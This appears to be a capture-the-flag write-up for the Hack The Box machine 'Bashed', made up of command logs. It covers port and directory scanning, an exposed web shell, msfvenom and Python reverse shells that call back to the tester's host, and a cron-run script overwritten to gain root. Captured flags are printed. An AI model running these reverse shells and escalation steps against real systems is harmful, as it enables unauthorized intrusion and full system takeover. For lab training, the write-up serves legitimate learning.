# Bashed - https://www.hackthebox.com/machines/bashed
```bash
nmap -sV -sC 10.129.213.165       
Nmap scan report for 10.129.213.165
Host is up (0.051s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
```
```bash
gobuster dir -u http://10.129.213.165:80/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.213.165:80/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 317] [--> http://10.129.213.165/images/]                                       
/.php                 (Status: 403) [Size: 293]
/php                  (Status: 301) [Size: 314] [--> http://10.129.213.165/php/]                                          
/config.php           (Status: 200) [Size: 0]
/uploads              (Status: 301) [Size: 318] [--> http://10.129.213.165/uploads/]                                      
/dev                  (Status: 301) [Size: 314] [--> http://10.129.213.165/dev/]                                          
/css                  (Status: 301) [Size: 314] [--> http://10.129.213.165/css/]                                          
/js                   (Status: 301) [Size: 313] [--> http://10.129.213.165/js/]                                           
Progress: 171436 / 283418 (60.49%)[ERROR] Get "http://10.129.213.165:80/site_tools.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 283416 / 283418 (100.00%)
===============================================================
Finished
===============================================================
```

```bash
# Go to http://10.129.213.165/dev/ and open phpbash.php after that use that console to obtain user flag:
www-data@bashed:/var/www/html/dev# ls
phpbash.min.php
phpbash.php
www-data@bashed:/var/www/html/dev# cd ..
www-data@bashed:/var/www/html# cd ..
www-data@bashed:/var/www# cd ..
www-data@bashed:/var# cd ..
www-data@bashed:/# cd ..
www-data@bashed:/# cd ..
www-data@bashed:/# ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
scripts
srv
sys
tmp
usr
var
vmlinuz
www-data@bashed:/# cd home
www-data@bashed:/home# ls
arrexel
scriptmanager
www-data@bashed:/home# cd arrexel
www-data@bashed:/home/arrexel# ls
user.txt
www-data@bashed:/home/arrexel# cat user.txt
1eae4400781364611bcc305f53ef07c1
```

```bash
 msfvenom -p php/reverse_php LHOST=10.10.14.56 LPORT=9001 -f raw > shell2.php

[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 3000 bytes

```
```bash
go back to http://10.129.213.165/dev/phpbash.php:
www-data@bashed:/var/www/html# cd uploads
www-data@bashed:/var/www/html/uploads# ls
index.html
```
```bash
python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```bash
www-data@bashed
:/var/www/html/uploads# wget http://10.10.14.56/shell2.php

--2024-05-22 05:55:12-- http://10.10.14.56/shell2.php
Connecting to 10.10.14.56:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2969 (2.9K) [application/octet-stream]
Saving to: 'shell2.php'

0K .. 100% 7.40M=0s

2024-05-22 05:55:13 (7.40 MB/s) - 'shell2.php' saved [2969/2969]
```
```bash
nc -lvnp 9001
listening on [any] 9001 ...
```
```bash
visit http://10.129.213.165/uploads/shell2.php and after that your listener 
```
```bash
nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.56] from (UNKNOWN) [10.129.213.165] 34756
sudo -u scriptmanager /bin/bash

python -c ‘import pty; pty.spawn(“/bin/bash”);’

sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
sudo -u scriptmanager

sudo -u scriptmanager id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
sudo -u scriptmanager /bin/bash

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
```bash
# even tough i could connect, i wasn't able become scriptmanager. I got another reverseshell from pentestmonkey. We will complete the task with it
nc -nvlp 1234 
listening on [any] 1234 ...
```
```bash
# go to http://10.129.213.165/dev/phpbash.php and use the code from pentestmonkey remember to change IP:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.56",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
```bash
nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.56] from (UNKNOWN) [10.129.213.165] 39214
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
$ sudo -u scriptmanager /bin/bash
ls
phpbash.min.php
phpbash.php
id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
cd ..
cd ..
cd ..
cd ..
ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
scripts
srv
sys
tmp
usr
var
vmlinuz
ls -al
total 92
drwxr-xr-x  23 root          root           4096 Jun  2  2022 .
drwxr-xr-x  23 root          root           4096 Jun  2  2022 ..
-rw-------   1 root          root            212 Jun 14  2022 .bash_history
drwxr-xr-x   2 root          root           4096 Jun  2  2022 bin
drwxr-xr-x   3 root          root           4096 Jun  2  2022 boot
drwxr-xr-x  19 root          root           4140 May 22 04:52 dev
drwxr-xr-x  89 root          root           4096 Jun  2  2022 etc
drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
drwxr-xr-x   2 root          root           4096 Jun  2  2022 lib64
drwx------   2 root          root          16384 Dec  4  2017 lost+found
drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
drwxr-xr-x   2 root          root           4096 Jun  2  2022 mnt
drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
dr-xr-xr-x 177 root          root              0 May 22 04:52 proc
drwx------   3 root          root           4096 May 22 04:52 root
drwxr-xr-x  18 root          root            540 May 22 06:25 run
drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun  2  2022 scripts
drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
dr-xr-xr-x  13 root          root              0 May 22 04:52 sys
drwxrwxrwt  10 root          root           4096 May 22 07:29 tmp
drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
drwxr-xr-x  12 root          root           4096 Jun  2  2022 var
lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
cd scripts
ls -al
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 May 22 07:29 test.txt
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```
```bash
nano test.py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.56",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
```
```bash
python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```bash
wget http://10.10.14.56/test.py
--2024-05-22 09:58:21--  http://10.10.14.56/test.py
Connecting to 10.10.14.56:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 215 [text/x-python]
Saving to: 'test.py.1'

     0K                                                       100% 75.5M=0s

2024-05-22 09:58:21 (75.5 MB/s) - 'test.py.1' saved [215/215]

rm test.py 
mv test.py.1 test.py
ls -la
total 88
drwxrwxr--  2 scriptmanager scriptmanager  4096 May 22 09:59 .
drwxr-xr-x 23 root          root           4096 Jun  2  2022 ..
-rw-------  1 scriptmanager scriptmanager 12288 May 22 09:49 .script.py.swp
-rw-r--r--  1 scriptmanager scriptmanager 12288 May 22 09:37 .test.py.swl
-rw-r--r--  1 scriptmanager scriptmanager 12288 May 22 07:57 .test.py.swm
-rw-r--r--  1 scriptmanager scriptmanager 12288 May 22 07:54 .test.py.swn
-rw-r--r--  1 scriptmanager scriptmanager 12288 May 22 07:52 .test.py.swo
-rw-r--r--  1 scriptmanager scriptmanager 12288 May 22 07:49 .test.py.swp
-rw-r--r--  1 scriptmanager scriptmanager   215 May 22 09:55 test.py
-rw-r--r--  1 root          root             12 May 22 09:59 test.txt
wget http://10.10.14.56/test.py
--2024-05-22 09:58:21--  http://10.10.14.56/test.py
Connecting to 10.10.14.56:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 215 [text/x-python]
Saving to: 'test.py.1'

     0K                                                       100% 75.5M=0s

2024-05-22 09:58:21 (75.5 MB/s) - 'test.py.1' saved [215/215]

rm test.py 
mv test.py.1 test.py
ls -la
total 88
drwxrwxr--  2 scriptmanager scriptmanager  4096 May 22 09:59 .
drwxr-xr-x 23 root          root           4096 Jun  2  2022 ..
-rw-------  1 scriptmanager scriptmanager 12288 May 22 09:49 .script.py.swp
-rw-r--r--  1 scriptmanager scriptmanager 12288 May 22 09:37 .test.py.swl
-rw-r--r--  1 scriptmanager scriptmanager 12288 May 22 07:57 .test.py.swm
-rw-r--r--  1 scriptmanager scriptmanager 12288 May 22 07:54 .test.py.swn
-rw-r--r--  1 scriptmanager scriptmanager 12288 May 22 07:52 .test.py.swo
-rw-r--r--  1 scriptmanager scriptmanager 12288 May 22 07:49 .test.py.swp
-rw-r--r--  1 scriptmanager scriptmanager   215 May 22 09:55 test.py
-rw-r--r--  1 root          root             12 May 22 09:59 test.txt
```




```bash
nc -nvlp 1337
listening on [any] 1337 ...
connect to [10.10.14.56] from (UNKNOWN) [10.129.213.165] 36482
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cd /root
# ls -la
total 28
drwx------  3 root root 4096 May 22 04:52 .
drwxr-xr-x 23 root root 4096 Jun  2  2022 ..
lrwxrwxrwx  1 root root    9 Jun  2  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root 3121 Dec  4  2017 .bashrc
drwxr-xr-x  2 root root 4096 Jun  2  2022 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   33 May 22 04:52 root.txt
-rw-r--r--  1 root root   66 Dec  4  2017 .selected_editor
# cat root.txt
c4e4fa167be7b37067748cd1be53c1a8
```
